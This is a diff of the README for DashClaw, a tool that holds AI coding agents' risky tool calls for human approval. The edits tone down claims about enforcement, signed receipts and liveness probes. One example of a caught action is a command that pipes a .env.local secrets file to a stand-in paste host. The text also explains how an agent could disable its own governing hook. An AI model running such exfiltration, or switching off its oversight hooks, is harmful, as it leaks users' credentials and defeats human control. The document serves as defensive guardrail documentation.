@@ -3,7 +3,7 @@
 
   <h1>DashClaw</h1>
 
-  <p><strong>When your AI coding agent tries something destructive, DashClaw catches it before it runs and asks you first, even when you are not at the keyboard.</strong></p>
+  <p><strong>With a supported enforcement integration, when your AI coding agent tries something destructive, DashClaw catches it before it runs and asks you first, even when you are not at the keyboard.</strong></p>
 
   <p>Run agents unattended without giving them unconditional authority.</p>
 
@@ -12,7 +12,7 @@
     <a href="https://www.npmjs.com/package/dashclaw"><img alt="npm" src="https://img.shields.io/npm/v/dashclaw?style=flat-square&color=orange&label=npm%3A%20dashclaw" /></a>
     <a href="https://pypi.org/project/dashclaw/"><img alt="PyPI" src="https://img.shields.io/pypi/v/dashclaw?style=flat-square&color=orange&label=pypi%3A%20dashclaw" /></a>
     <a href="https://github.com/ucsandman/DashClaw/blob/main/LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-green?style=flat-square" /></a>
-    <img alt="Node 18+" src="https://img.shields.io/badge/node-18%2B-blue?style=flat-square" />
+    <img alt="Platform: Node 20+" src="https://img.shields.io/badge/platform%20node-20%2B-blue?style=flat-square" />
     <img alt="Python 3.7+" src="https://img.shields.io/badge/python-3.7%2B-blue?style=flat-square" />
   </p>
 
@@ -20,7 +20,7 @@
     <a href="https://dashclaw.io"><img alt="Website" src="https://img.shields.io/badge/site-dashclaw.io-111?style=flat-square" /></a>
     <a href="https://dashclaw.io/docs"><img alt="Docs" src="https://img.shields.io/badge/docs-SDK%20%26%20API-111?style=flat-square" /></a>
     <a href="THESIS.md"><img alt="Thesis" src="https://img.shields.io/badge/thesis-what%20this%20is-111?style=flat-square" /></a>
-    <a href="docs/maintainer-log.md"><img alt="Maintainer log" src="https://img.shields.io/badge/log-every%20decision%2C%20public-111?style=flat-square" /></a>
+    <a href="docs/maintainer-log.md"><img alt="Maintainer log" src="https://img.shields.io/badge/log-maintainer%20changes%2C%20public-111?style=flat-square" /></a>
   </p>
 
   <sub>
@@ -41,32 +41,32 @@ npx dashclaw up      # no account, first caught action in minutes
 
 <div align="center">
   <br />
-  <img src="public/media/marketing/readme-demo.gif" alt="The Approvals inbox holding a risk-scored deploy action; one click on Allow releases it and the decision is recorded" width="760" />
+  <img src="public/media/marketing/readme-demo.gif" alt="Illustration of a pending action and the Allow control in the Approvals inbox" width="760" />
   <br />
-  <sub>An agent tries a destructive tool call. DashClaw freezes it before it runs, routes it to the Approvals inbox, and writes a replayable decision record when you resolve it.</sub>
+  <sub>A hook-integrated agent tries a destructive tool call. DashClaw freezes it before it runs, routes it to the Approvals inbox, and writes a replayable decision record when you resolve it.</sub>
   <br />
-  <sub><a href="https://www.dashclaw.io/media/marketing/launch.mp4">▶ Watch the 55-second launch film</a> (with the full walkthrough) or see it on <a href="https://www.dashclaw.io">dashclaw.io</a>.</sub>
+  <sub>This illustration shows the approval workflow. <a href="https://www.dashclaw.io/demo">Explore the current interactive demo</a> for the supported product surfaces.</sub>
 </div>
 
 ## What you get
 
 A 10-second capability scan before the dense sections:
 
-- **Fail-closed intercept.** A blocked tool call never runs. The hook cancels it before execution (exit 2 at the seam).
+- **Fail-closed intercept at the execution seam.** The Claude Code, Codex, and Hermes hooks, the OpenClaw gateway, and `dashclaw_invoke` can cancel a blocked call before execution. Bare SDK, API, and ordinary MCP integrations are cooperative: the caller must honor the verdict.
 - **One-click remote approval.** Resolve from the `/approvals` inbox, the CLI, a phone PWA, Telegram, or Discord. No presence required.
 - **Approvals in plain English.** Every pending item leads with one sentence for what the command actually does, flags what cannot be undone, and warns when a file holds credentials. When no rule reads the command with confidence, it says so instead of guessing. The exact command is always shown underneath.
-- **"Allow, don't ask again."** The same interruption twice is a bug in your rules, not a decision. One click approves the action, writes a target-scoped grant with a lease you pick, and releases every waiting approval that grant covers. Scope is the exact target, never a folder. Above risk 70 the option is withheld and says so. Active grants sit at the top of the inbox with a countdown and a Revoke button.
-- **Tamper-evident audit.** Every decision lands in a signed, replayable ledger, and anyone can verify a receipt without an API key (Ed25519, key published via JWKS).
+- **"Allow, don't ask again."** Preview the target, lease, and matching pending items before creating a scoped standing grant. The UI resolves eligible items through the normal approval path and reports partial failures. High-risk, ungrantable, expired, or self-approved sources are rejected. Standing grants remain visible and revocable in the inbox.
+- **Verifiable recorded evidence.** Decision records, Ed25519 receipts where issued, and signed exports support later review. A receipt verifies its signed contents, not that an external effect happened. Authenticated identity and action-payload signing are shown separately.
 - **Calibrated interruptions.** Your approve/deny verdicts tune how often it interrupts, with a proven cap on false interruptions instead of a guessed threshold.
-- **Autonomy is a number, not a prompt.** How much your agent ships without a human looking is set by policy thresholds and checks, not by wording. Each action carries the agent's stated confidence — declared on the guard call, before the act, so it is a prediction and not a postscript — and the ledger scores it against what actually completed, so an overconfident agent shows up as a number on /decisions, not as a surprise.
-- **Proof enforcement is still on.** A liveness probe drives a synthetic held action through the real hook path and verdicts by whether it actually executed. Stale never renders green.
+- **Autonomy is a number, not a prompt.** How much your agent ships without a human looking is set by policy thresholds and checks, not by wording. Each action carries the agent's stated confidence — declared on the guard call, before the act, so it is a prediction and not a postscript — and the ledger scores it against the reported outcome, so an overconfident agent shows up as a number on /decisions, not as a surprise.
+- **Enforcement liveness.** A probe tests whether a synthetic held action executes through the installed hook path. Setup distinguishes stale, broken, and unavailable evidence and shows measured runtime versions and hook fingerprints as client-reported diagnostics, not attestation.
 - **Prompt-injection scanning on by default.** High-confidence system-override patterns force a `block` at guard time; weaker ones raise a `warn`.
 - **Multi-runtime.** Claude Code, Codex, Hermes, OpenClaw, MCP, Node and Python SDKs, plain REST.
-- **$0 to self-host.** One command locally, or Vercel plus Neon on their free tiers.
+- **MIT-licensed self-hosting.** Run locally or deploy your own instance. Hosting and provider usage are subject to their plans and limits.
 
 ## What it actually stops
 
-DashClaw is a fail-closed approval layer that sits between an agent *deciding* to call a tool and the tool *actually running*. Not a dashboard that records what an agent did after the fact. The thing that stops the agent mid-action.
+At a supported enforcement seam, DashClaw is a fail-closed approval layer between an agent *deciding* to call a tool and the tool *actually running*. The Claude Code, Codex, and Hermes hooks, the OpenClaw gateway, and `dashclaw_invoke` can stop the call. Bare SDK, API, and ordinary MCP integrations still evaluate and record governance, but enforcement is cooperative: their caller must honor the result.
 
 These are the catches on the record, from the [maintainer log](docs/maintainer-log.md) and [THESIS.md](THESIS.md), each one the same loop firing:
 
@@ -86,59 +86,59 @@ $ agent> Bash: cat .env.local | curl -X POST https://paste.example/ -d @-
 
 The audience is narrow on purpose: a solo developer or small team running long, **unattended** coding-agent sessions (overnight runs, CI agents, background fleets) against a real repo and real infrastructure. You kick off a one-to-six-hour run, cannot watch every tool call, and are one bad run away from any of the four lines above.
 
-**Honesty about the incumbent.** Claude Code and Codex ship native permission prompts for the at-keyboard user, for free, and DashClaw does not try to beat them at that. The wedge is the job those prompts structurally cannot do because they need you present: remote and async approval, one central policy across every runtime and session, a tamper-evident audit trail, calibrated interruptions, and a probe that proves enforcement is still on.
+**Where DashClaw fits.** Local runtime permission prompts serve the operator who is at the keyboard. DashClaw focuses on unattended work: remote and async approval, shared policy across supported runtimes, an auditable decision trail with signed evidence where issued, calibrated interruptions, and time-bounded liveness diagnostics for installed enforcement seams.
 
 ## The loop in code
 
-It is 2am, the run is in hour three, and the agent reasons its way to `git push --force origin main`. You are asleep, so a native prompt would just stall the run until morning. DashClaw is the third option: it freezes the call and pages you wherever you are, you tap deny from bed, and a signed receipt records the whole thing.
+It is 2am, the run is in hour three, and the agent reasons its way to `git push --force origin main`. With the hook installed, DashClaw freezes the call and pages you wherever you are; you tap deny, and the decision ledger records the resolution. A signed receipt exists only where the eligible evidence path issues one.
 
-Four calls. The hook seam runs them for you inside Claude Code, Codex, and Hermes; the SDK below is the same thing done explicitly.
+The hook seam owns this lifecycle inside Claude Code, Codex, and Hermes. A bare SDK integration is cooperative, so application code must keep the real effect inside `runGoverned()` as shown here.
 
 ```javascript
 import { DashClaw } from 'dashclaw';
 const claw = new DashClaw({ baseUrl: process.env.DASHCLAW_BASE_URL, apiKey: process.env.DASHCLAW_API_KEY, agentId: 'nightly-agent' });
 
-// 1. Decide. Attach the real act; the server classifies from evidence, and evidence can only raise risk, never lower it.
-const g = await claw.guard({ action_type: 'shell', act: { kind: 'shell', command: 'git push --force origin main' } });
-const action = await claw.createAction({ action_type: 'shell', declared_goal: 'Force-push the rebased branch' });
-
-// 2. Freeze until a human resolves it, from anywhere. Grants are single-use and bound to this exact act.
-if (g.decision === 'require_approval') await claw.waitForApproval(action.action_id);
-
-// 3. Close the record. One-shot and durable (retry-safe): the first outcome wins, later writes 409.
-try { await run(); await claw.reportActionSuccess(action.action_id, 'Pushed'); }
-catch (err) { await claw.reportActionFailure(action.action_id, err.message); }
+await claw.runGoverned(
+  // The exact act is scrubbed, classified, recorded, and bound to the execution claim.
+  { kind: 'shell', command: 'git push --force origin main' },
+  { action_type: 'shell', declared_goal: 'Force-push the rebased branch' },
+  async () => run(),
+);
 ```
 
-Python is the same shape in `snake_case`. Full example: [`QUICK-START.md`](QUICK-START.md). Method catalogues: [`sdk/README.md`](sdk/README.md), [`sdk-python/README.md`](sdk-python/README.md).
+`runGoverned()` waits for required approval, claims one execution attempt under a fresh policy check, invokes the callback, and reports the outcome. The claim binds the action, agent, credential principal, and exact act; any applicable operator or plan authority is consumed atomically with the claim. If claim or completion acknowledgement is lost, the helper does not repeat the callback. Reconcile the action and external system before retrying; ledger idempotency cannot make an external effect exactly once. Python uses `run_governed()`. Full example: [`QUICK-START.md`](QUICK-START.md).
+
+**Upgrade order:** deploy the matching schema and server before upgrading governed SDK helpers, which require execution-claim protocol 1. Hooks and OpenClaw preserve legacy guard/approval behavior only when the server advertises no claim protocol; that mode lacks atomic execution claims. Malformed or unsupported advertisements fail closed. Set `DASHCLAW_REQUIRE_EXECUTION_CLAIMS=1` after the server upgrade to reject legacy responses. See the [execution contract](docs/architecture/durable-execution-finality.md).
 
 ```mermaid
 flowchart LR
     A[Agent decides<br/>to call a tool] --> B{Guard scores<br/>the act vs<br/>your policies}
-    B -->|allow / warn| C[Tool runs]
+    B -->|allow / warn| G[Fresh policy check<br/>and atomic execution claim]
     B -->|block| D[Hard stop<br/>fail-closed, hook exit 2]
     B -->|allow_contained| F[Staged in a worktree<br/>diff awaits promote/discard]
     B -->|require_approval| E[Action frozen]
-    E -->|approve, from anywhere| C
+    E -->|approve, from anywhere| G
     E -->|deny| D
-    F -->|promote| C
+    F -->|promote| G
     F -->|discard| D
-    C --> L[(Signed, replayable<br/>audit row)]
+    G -->|confirmed claim| C[Tool runs]
+    G -->|rejected or uncertain| D
+    C --> L[(Decision and outcome records<br/>receipts where issued)]
     D --> L
-    L -.-> P[Liveness probe re-drives<br/>the seam and verdicts by<br/>execution, never the ledger]
+    L -.-> P[Independent liveness probe<br/>tests the installed seam]
 ```
 
 The decision lattice is `allow < warn < allow_contained < require_approval < block`. Join is `max`; a `block` is absolute and cannot be downgraded in the ledger. `allow_contained` only ever reaches a caller that advertised the capability string for the staging medium it would use — `client_capabilities: ['allow_contained']` for a git worktree, `['allow_contained:db']` for an ephemeral database branch; an older client sees `require_approval` instead (version skew only tightens).
 
 > [!IMPORTANT]
-> **Enforcement is mechanically real only where DashClaw sits in the seam between decide and execute:** the Claude Code, Codex, and Hermes PreToolUse hooks (fail-closed, exit-2 on block), the OpenClaw gateway, and `dashclaw_invoke`. Everywhere else (bare SDK, API, and MCP callers, desktop chat) governance is **cooperative**: the caller consults guard and honors the decision, every call is still recorded, and a block is never downgraded in the ledger. DashClaw does not claim universal hard enforcement, and this README never will. And even at the mechanical seam, the hook runs at the agent's own privilege level — it is a **seatbelt against accidents, not a cage against intent**. An agent with write access to the hook path can, in principle, disable its governor; DashClaw makes that act blocked-by-policy and loudly visible (control-plane `block` policy, liveness probe, `executed_despite` witness), but the tamper-proof boundary belongs to your deployment: a container, a separate OS user, or a read-only mount of the hook path. Per-surface table and full threat model: [`docs/architecture/enforcement-boundary.md`](docs/architecture/enforcement-boundary.md).
+> **Enforcement is mechanically real only where DashClaw sits in the seam between decide and execute:** the Claude Code, Codex, and Hermes PreToolUse hooks (fail-closed, exit-2 on block), the OpenClaw gateway, and `dashclaw_invoke`. Everywhere else (bare SDK, API, and MCP callers, desktop chat) governance is **cooperative**: the caller consults guard and honors the decision; recording requires the caller to use a recording path. A block is never downgraded in the ledger. DashClaw does not claim universal hard enforcement. Even at the mechanical seam, the hook runs at the agent's own privilege level. An agent with write access to the hook path can disable its governor; DashClaw can govern and report that write, but the tamper-resistant boundary belongs to the deployment: a container, separate OS user, or read-only hook path. Per-surface table and full threat model: [`docs/architecture/enforcement-boundary.md`](docs/architecture/enforcement-boundary.md).
 
 ## What DashClaw is not
 
 This section exists so you can rule the tool out fast if it is the wrong thing.
 
-- **Not observability.** LangSmith and Langfuse record what happened. DashClaw prevents it from happening. If you want traces and dashboards, this is not that.
-- **Not an agent platform.** No tools to help an agent achieve a goal (no calendar, CRM, messaging, RAG). It governs the goals other things pursue. The v5.0.0 cull deleted the platform tier outright and a CI [surface-budget brake](THESIS.md#the-anti-regrowth-brake) mechanically prevents it growing back.
+- **Not a general tracing product.** DashClaw focuses on policy decisions before execution. It can halt calls at the supported mechanical seams above; cooperative callers must honor the result. If you primarily need model traces and evaluation dashboards, this is not that.
+- **Not a general agent platform.** DashClaw does not provide a broad calendar, CRM, messaging, or RAG tool suite. It retains one bounded, operator-configured capability seam: `dashclaw_invoke` can hold a registered credential and execute that registered external API after server-side governance. The v5.0.0 cull removed the wider platform tier, and a CI [surface-budget brake](THESIS.md#the-anti-regrowth-brake) prevents it growing back.
 - **Not universal hard enforcement.** Enforcement is mechanical only at the seam (the hooks, the OpenClaw gateway, `dashclaw_invoke`); everywhere else it is cooperative. See the boundary note above.
 - **Not tamper-proof against the agent it governs.** The hook runs at the agent's privilege level, inside the blast radius of the thing it governs. It stops the accident class and makes tampering visible and policy-blocked; it cannot stop a determined process executing at the same privilege. Real isolation is a deployment property — container, separate OS user, or read-only hook path — and DashClaw's docs say so instead of pretending otherwise.
 - **Not battle-tested at scale.** First commit was February 2026. It is proven by continuous dogfood, not by a large install base. See [Project status](#project-status).
@@ -152,10 +152,10 @@ Day-to-day, DashClaw is built and maintained by an AI agent, in public. That age
 1. **Blocks are absolute.** A `block` is never downgraded, in the ledger or anywhere else.
 2. **No self-approval.** The maintainer cannot approve its own governed actions.
 3. **Humans ratify every loosening.** Any policy relaxation routes through a human-ratified proposal.
-4. **Credentials stay human.** API keys and secret values never move to the maintainer.
-5. **Claims are proven live.** If a claim in the docs cannot be demonstrated against the running system, it does not ship.
+4. **Credential-gated acts stay human-controlled.** Production data, publishing, billing, and infrastructure changes require the owner's authorization.
+5. **The charter remains human-held.** Its constitutional rules change only at the owner's explicit direction. The operating protocol separately requires live proof for public claims.
 
-Every decision the maintainer makes is on the record in the [maintainer log](docs/maintainer-log.md). Governing autonomous agents is the exact problem DashClaw exists to solve, so the project governs its own maintainer with its own runtime. That is the source of the sharpest design constraints below, not a gimmick. Honesty is a brand pillar here, which is why the enforcement boundary, the blackout, and the liveness incident are all in this README on purpose.
+Material maintainer changes and design decisions are recorded in the [maintainer log](docs/maintainer-log.md). Governing autonomous agents is the exact problem DashClaw exists to solve, so the project governs its own maintainer with its own runtime. That is the source of the sharpest design constraints below. The enforcement boundary, the blackout, and the liveness incident are included here so the claims remain auditable.
 
 ## Quick start
 
@@ -166,13 +166,13 @@ npx dashclaw up
 One command provisions Postgres (Docker or embedded), generates secrets, mints your API key, applies migrations, starts on `:3000`, offers to wire Claude Code hooks, and opens your browser already signed in. No account required on the path to your first caught action.
 
 <details>
-<summary><strong>Deploy to the cloud for $0, or try the hosted inbox first</strong></summary>
+<summary><strong>Deploy to the cloud, or try the hosted inbox first</strong></summary>
 
 <br />
 
 [![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fucsandman%2FDashClaw&env=DATABASE_URL,DASHCLAW_API_KEY,ENCRYPTION_KEY,NEXTAUTH_SECRET,NEXTAUTH_URL,CRON_SECRET,DASHCLAW_LOCAL_ADMIN_PASSWORD&envDescription=Required%20DashClaw%20configuration.%20See%20.env.example%20for%20details.&envLink=https%3A%2F%2Fgithub.com%2Fucsandman%2FDashClaw%2Fblob%2Fmain%2F.env.example&project-name=my-dashclaw&repository-name=my-dashclaw&products=%5B%7B%22type%22%3A%22integration%22%2C%22integrationSlug%22%3A%22neon%22%2C%22productSlug%22%3A%22neon%22%2C%22protocol%22%3A%22storage%22%7D%5D&skippable-integrations=1)
 
-Vercel free tier plus Neon free tier is $0. Click the button, add Neon when prompted, fill in the env vars from [`.env.example`](.env.example). The schema migration runs during the build.
+Click the button, add Neon when prompted, and fill in the variables from [`.env.example`](.env.example). Provider plans and limits determine hosting cost. The configured Vercel build runs schema migration before building the app; required-schema or migration-checksum failures stop it.
 
 The hosted trial is the **secondary** door: to see the Approvals inbox before deploying anything, [hosted.dashclaw.io](https://hosted.dashclaw.io/connect) mints a capped trial workspace in the browser. Coming from the trial, click **Export workspace** on its `/connect` card and run `dashclaw import <bundle.json>` against your own instance. Policies, decisions, history, agents, and assumptions carry over; API keys and secret values never ride a bundle. Operator runbook: [`docs/hosted-deployment-runbook.md`](docs/hosted-deployment-runbook.md).
 
@@ -224,7 +224,7 @@ Claude Code hooks govern Bash, Edit, Write, MultiEdit, sub-agent spawns, and eve
 echo '{"tool_name":"Bash","tool_input":{"command":"echo hello"},"tool_use_id":"t1","session_id":"smoke"}' | python .claude/hooks/dashclaw_pretool.py
 ```
 
-**OpenClaw.** [`@dashclaw/openclaw-plugin`](packages/openclaw-plugin) intercepts every tool call at the gateway, so the agent calls no DashClaw tool itself — the CLI installs it, patches config, and writes the governance protocol into the resolved workspace's `AGENTS.md`.
+**OpenClaw.** [`@dashclaw/openclaw-plugin`](packages/openclaw-plugin) intercepts calls delivered through the gateway's installed `before_tool_call` hook, so those calls need no agent-initiated DashClaw tool. The CLI installs it, patches config, and writes the governance protocol into the resolved workspace's `AGENTS.md`. Embedded native tools need their own runtime hooks.
 
 ```bash
 dashclaw install openclaw
@@ -241,7 +241,7 @@ Run it bare in a terminal and it walks you through everything you're missing: no
 
 Every instance also serves Streamable HTTP MCP at `/api/mcp`. For Claude Desktop, add that URL as a custom connector (Settings, Connectors); OAuth auto-discovers, no key in the UI.
 
-**SDKs.** `npm install dashclaw` (Node 18+) or `pip install dashclaw` (Python 3.7+). The **40-method canonical Node surface** covers guard, record, assumptions, approvals, durable-execution finality, security scanning, sessions and the action graph, pairing, risk signals, policy simulation, plan authorization, delegation constraints, containment verdicts, and team tasks. The **Python SDK exposes 60 methods**, plus CrewAI and AutoGen integrations. Plan authorization pins the approved plan's content hash at submission (`plan_hash`); `attestPlan(planId, planHash)` / `attest_plan(plan_id, plan_hash)` let an unattended runner confirm -- before its first model call -- that the plan it is about to act under is still approved, unexpired, and hash-matched, failing closed on drift (`not_approved | expired | revoked | hash_mismatch`) without ever echoing the stored hash back on a mismatch.
+**SDKs.** `npm install dashclaw` (Node 18+) or `pip install dashclaw` (Python 3.7+). The **41-method canonical Node surface** covers guard, record, assumptions, approvals, durable-execution finality, security scanning, sessions and the action graph, pairing, risk signals, policy simulation, plan authorization, delegation constraints, containment verdicts, and team tasks. The **Python SDK exposes 61 methods**, plus CrewAI and AutoGen integrations. Plan authorization pins the approved plan's content hash at submission (`plan_hash`); `attestPlan(planId, planHash)` / `attest_plan(plan_id, plan_hash)` let an unattended runner confirm -- before its first model call -- that the plan it is about to act under is still approved, unexpired, and hash-matched, failing closed on drift (`not_approved | expired | revoked | hash_mismatch`) without ever echoing the stored hash back on a mismatch.
 
 **REST.** Every primitive is HTTP. The stable contract is pinned in [`docs/openapi/critical-stable.openapi.json`](docs/openapi/critical-stable.openapi.json); the full inventory (**134 routes**: 42 stable, 18 beta, 74 experimental) is in [`docs/api-inventory.md`](docs/api-inventory.md). Webhooks: `decision.created`, `action.created`, `lost_confirmation`, configurable per org.
 
@@ -249,24 +249,16 @@ Every instance also serves Streamable HTTP MCP at `/api/mcp`. For Claude Desktop
 
 ## The governance model
 
-<div align="center">
-  <br />
-  <img src="brand/social/governance-blueprint.png" alt="Blueprint-style diagram: an agent's tool call is risk-scored, enters the guard, and routes to one of four verdicts — allow, warn, require_approval held for a human, or block — with every decision recorded on an append-only audit trail" width="760" />
-  <br />
-  <sub>Every tool call, governed: one guard, four verdicts, a permanent record.</sub>
-  <br />
-</div>
+The protocol-1 diagram above shows the current execution path. Eight points define its scope:
 
-Control before execution, not observability after it. Eight points, each falsifiable:
-
-1. **Every risky action is evaluated against active policies before it runs.** Policies are declarative. The builder ships with ten pre-built safety switches (Deploy Gate, Risk Threshold, Rate Limiter, Evidence Required, Protected Path, Subagent Constraint, and others across 17 guard policy types), an AI generator, YAML import, and a pack gallery at `/policies/packs` — 18 curated packs (spend, outbound comms, unattended overnight runs, prod infra, subagent fleets, and more), each previewable against your own action history before a one-click install.
-2. **The default pack is catastrophe-only.** Seeded automatically for every new self-hosted org, it interrupts for the irreversible class: mass-destructive filesystem, git, and database actions and writes to secret files (`.env`, `*.pem`, `*.key`, `secrets/**`) are held for one-click approval. Nothing is refused outright; the human decides. A warn-only rate limit nets runaways; everything else runs. This is a documented lesson, not a preference. See below.
+1. **Every action inside a mechanical integration's configured governance scope is evaluated against active policies before that integration releases it.** Cooperative SDK, API, and ordinary MCP callers receive the same verdict but remain responsible for honoring it. Policies are declarative. The builder ships with ten pre-built safety switches (Deploy Gate, Risk Threshold, Rate Limiter, Evidence Required, Protected Path, Subagent Constraint, and others across 17 guard policy types), an AI generator, YAML import, and a pack gallery at `/policies/packs` — 18 curated packs (spend, outbound comms, unattended overnight runs, prod infra, subagent fleets, and more), each previewable against your own action history before a one-click install.
+2. **The default pack is narrowly scoped.** New self-hosted organizations receive the catastrophe pack. Its named rules hold protected-target destruction, force pushes, secret-file writes, and classified real-money purchases. Risk score alone does not trigger every hold, and ordinary project cleanup is not universally blocked. Review the [actual rules](app/lib/guardrails/packs/catastrophe-only/policies.yml) and your active Short List; additional policies can impose stricter decisions.
 3. **Sensitive actions require human approval, and the approval is one click.** Approvals route to `/approvals`, the CLI, the mobile PWA at `/approve`, Telegram, or Discord. When one policy blows its interruption budget, per-action pings collapse into one flood banner with bulk-resolve. A repeat interruption can be retired at the card with "Allow, don't ask again", which writes a target-scoped, expiring, revocable grant rather than silencing anything. Pending approvals are never auto-resolved.
-4. **Every decision is recorded and outcomes are durable.** A five-state finality machine plus a lost-confirmation sweep guarantee no silent double-execute on retry. Spec below and in [`docs/architecture/durable-execution-finality.md`](docs/architecture/durable-execution-finality.md).
+4. **Decisions are recorded and outcome transitions are durable.** A five-state finality machine distinguishes confirmed outcomes from `lost_confirmation`. Protocol-1 execution claims give one caller authority for one attempt, but they cannot prove whether an external effect completed after a response was lost. Unknown completion requires reconciliation or effect-specific idempotency before retry. Spec below and in [`docs/architecture/durable-execution-finality.md`](docs/architecture/durable-execution-finality.md).
 5. **Interruption precision is calibrated, not guessed.** A distribution-free controller ([`/policies#calibration`](docs/architecture/governance-core-theory.md), default preview) turns your approve/deny verdicts into a proven false-interruption bound. Shadow-first, then it loosens as well as tightens: below the calibrated threshold an approval request becomes a recorded warning instead, bounded by the riskiest action you have personally approved and retracted by a single deny. It never reaches `allow`, never touches a `block`, and never edits a policy — standing policy changes still route through human-ratified proposals.
-6. **Enforcement proves it is still on.** A liveness probe drives a synthetic held action through the real hook seam and verdicts by whether it executed, never by reading the ledger. Because once it did not, and nothing noticed. Stale never renders green.
+6. **Liveness checks test the installed seam.** A synthetic action tests whether the configured hook holds execution. Setup shows the result, reporting time, host-runtime version, and selected hook fingerprint. Missing or malformed reports remain unavailable. These client-reported checks do not establish continuous enforcement or resist a compromised same-user host.
 7. **Prompt-injection scanning is on by default.** High-confidence system-override patterns force a `block` at guard time; lower-severity patterns raise a `warn`.
-8. **An outside decision engine can tighten decisions, never loosen them.** An org can configure one external decision provider (configured on `/policies`); the guard calls it during every evaluation and joins its verdict stricter-wins — external `deny` is absolute for the evaluated act, external `allow` never overrides a stricter local result, and the verdict is identity-bound to the exact act. An unreachable provider takes an explicit posture (`fail_closed` default) and is always recorded as `external unavailable`, never as governance that happened. A domain-specific provider can be scoped to the exact action types it governs; out-of-scope acts stay local-only, never billed to the provider's authority. Contract: [`docs/external-verdict-provider.md`](docs/external-verdict-provider.md).
+8. **An outside decision engine can tighten decisions, never loosen them.** An org can configure one external decision provider on `/policies`; the guard calls it for applicable evaluations and joins its verdict stricter-wins — external `deny` is absolute for the evaluated act, external `allow` never overrides a stricter local result, and the verdict is bound to the exact input digest. An unreachable applicable provider takes an explicit posture (`fail_closed` default) and is recorded as `external unavailable`. A provider can be scoped to exact action types; out-of-scope acts stay local-only. Contract: [`docs/external-verdict-provider.md`](docs/external-verdict-provider.md).
 
 <details>
 <summary><strong>Why each of those is the way it is (the incidents behind the design)</strong></summary>
@@ -299,11 +291,11 @@ Approved actions carry a terminal outcome separate from their lifecycle status. 
 | `failed` | Attempted and errored. Set by the agent with an error message. |
 | `lost_confirmation` | Timeout exceeded without a report. Set by the cron sweep. |
 
-`POST /api/actions/[actionId]/outcome` is one-shot: the first call wins, every later POST returns 409. A cron sweep marks stale pending rows `lost_confirmation` and emits a `signal.detected` event, so a retry can never silently double-execute. Spec: [`docs/architecture/durable-execution-finality.md`](docs/architecture/durable-execution-finality.md).
+`POST /api/actions/[actionId]/outcome` is one-shot: the first call wins, every later POST returns 409. A cron sweep marks stale pending rows `lost_confirmation` and emits a `signal.detected` event. That state means completion is unknown, not that the effect did not happen. Reconcile the external system and action record, or use the target system's idempotency primitive, before retrying. Spec: [`docs/architecture/durable-execution-finality.md`](docs/architecture/durable-execution-finality.md).
 
 ## Approvals, from anywhere
 
-`waitForApproval()` unblocks near-instantly over SSE when any surface resolves the action, falling back to ~5-second polling.
+`waitForApproval()` uses SSE for low latency and falls back to polling, reconciling the authoritative action state before it resolves.
 
 | Surface | What it is | Setup |
 |---|---|---|
@@ -337,8 +329,8 @@ Approved actions carry a terminal outcome separate from their lifecycle status. 
 Stated plainly, because a security tool that oversells itself is a liability:
 
 - **Young and fast-moving.** First commit February 2026; releases land near-daily. The API surface is tiered for exactly this reason: 42 stable routes pinned in the [OpenAPI contract](docs/openapi/critical-stable.openapi.json), 18 beta, 74 experimental. Build against stable; experimental can change without notice.
-- **Proven by dogfood, not by scale.** The core loop runs continuously against the maintainer's own agent fleet and a CI policy-smoke harness that live-proves the public claims on every push. External production deployments are early. Treat this as young infrastructure that takes correctness seriously, not a battle-tested incumbent.
-- **AI-maintained, human-governed, in public.** Day-to-day maintenance is done by an AI agent under the human-held charter in [MAINTAINER.md](MAINTAINER.md), whose five invariants (above) the maintainer cannot change. Every decision is on the record in the [maintainer log](docs/maintainer-log.md).
+- **Proven by dogfood, not by scale.** The core loop runs against the maintainer's own agent fleet, and CI exercises specified policy and lifecycle contracts. External production deployments are early. Treat this as young infrastructure, not a battle-tested incumbent or an uptime commitment.
+- **AI-maintained, human-governed, in public.** Day-to-day maintenance is done by an AI agent under the human-held charter in [MAINTAINER.md](MAINTAINER.md), whose five invariants (above) the maintainer cannot change. Material changes and design decisions are recorded in the [maintainer log](docs/maintainer-log.md).
 
 ## Contributing and license
 
